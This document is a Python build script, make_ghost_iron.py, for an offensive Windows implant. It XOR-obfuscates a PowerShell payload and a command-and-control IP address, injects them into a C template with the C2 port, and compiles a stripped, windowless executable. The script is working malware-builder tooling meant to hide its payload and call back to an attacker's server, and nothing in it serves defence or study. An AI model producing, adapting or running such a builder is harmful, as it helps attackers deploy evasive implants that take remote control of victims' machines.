"""
make_ghost_iron.py -- Build script for ghost_iron.c (CHEYANNE x iron-sun polymorph)
Usage:
    python shell/make_ghost_iron.py <ps1_file> <c2_ip> <c2_port> [xor_key]
    python shell/make_ghost_iron.py shell/payload.ps1 192.168.1.92 4445 0xCD

Injects:
    - XOR-encrypted PS1 payload bytes
    - XOR-encrypted C2 IP bytes
    - XOR_KEY and C2_PORT defines
    Then optionally compiles with gcc/MinGW.
"""
import os
import sys
import re
import subprocess

TEMPLATE = os.path.join(os.path.dirname(__file__), "ghost_iron.c")
XK_STR = 0xAB  # string/IP XOR key -- MUST match ghost_iron.c

def xor_bytes(data: bytes, key: int) -> str:
    return ",".join(f"0x{b ^ key:02X}" for b in data)

def main():
    if len(sys.argv) < 4:
        print("Usage: make_ghost_iron.py <ps1_file> <c2_ip> <c2_port> [xor_key=0xCD]")
        sys.exit(1)

    ps1_file = sys.argv[1]
    c2_ip    = sys.argv[2]
    c2_port  = int(sys.argv[3])
    xor_key  = int(sys.argv[4], 16) if len(sys.argv) > 4 else 0xCD

    if not os.path.exists(ps1_file):
        print(f"[!] PS1 file not found: {ps1_file}")
        sys.exit(1)

    with open(ps1_file, "rb") as f:
        payload = f.read()

    payload_enc = xor_bytes(payload, xor_key)
    payload_len = len(payload)
    ip_enc      = xor_bytes(c2_ip.encode("ascii"), XK_STR)
    ip_len      = len(c2_ip)

    with open(TEMPLATE, "r", encoding="utf-8") as f:
        src = f.read()

    # Replace placeholder defines
    src = re.sub(r"#ifndef XOR_KEY\n#define XOR_KEY\s+0x\w+\n#endif",
                 f"#define XOR_KEY 0x{xor_key:02X}", src)
    src = re.sub(r"#ifndef C2_PORT\n#define C2_PORT\s+\d+\n#endif",
                 f"#define C2_PORT {c2_port}", src)

    # Replace payload placeholder
    src = src.replace(
        "static const unsigned char PAYLOAD_ENC[] = {0x00};\n#define PAYLOAD_LEN 0",
        f"static const unsigned char PAYLOAD_ENC[] = {{{payload_enc}}};\n"
        f"#define PAYLOAD_LEN {payload_len}\n#define PAYLOAD_DEFINED"
    )

    # Replace C2 IP placeholder
    if c2_port != 0:
        src = src.replace(
            "static const unsigned char xC2Ip[] = {0x00};\n#define xC2IpLen 0",
            f"static const unsigned char xC2Ip[] = {{{ip_enc}}};\n"
            f"#define xC2IpLen {ip_len}\n#define C2_IP_DEFINED"
        )

    out_path = os.path.join(os.path.dirname(__file__), "ghost_iron_out.c")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(src)

    print(f"[+] Generated: {out_path}")
    print(f"    payload={payload_len}B, ip={c2_ip}, port={c2_port}, xor=0x{xor_key:02X}")

    # Try to compile with gcc
    exe_out = os.path.join(os.path.dirname(__file__), "ghost_iron.exe")
    gcc_cmd = [
        "gcc", out_path, "-o", exe_out,
        "-lws2_32", "-lcrypt32",
        "-D_WIN32_WINNT=0x0600",
        "-mwindows",
        "-O2", "-s",
    ]
    print(f"[*] Compiling: {' '.join(gcc_cmd)}")
    try:
        r = subprocess.run(gcc_cmd, capture_output=True, text=True)
        if r.returncode == 0:
            size = os.path.getsize(exe_out)
            print(f"[+] ghost_iron.exe: {size}B")
        else:
            print(f"[!] Compile error:\n{r.stderr}")
    except FileNotFoundError:
        print("[!] gcc not found -- copy ghost_iron_out.c to build machine")

if __name__ == "__main__":
    main()
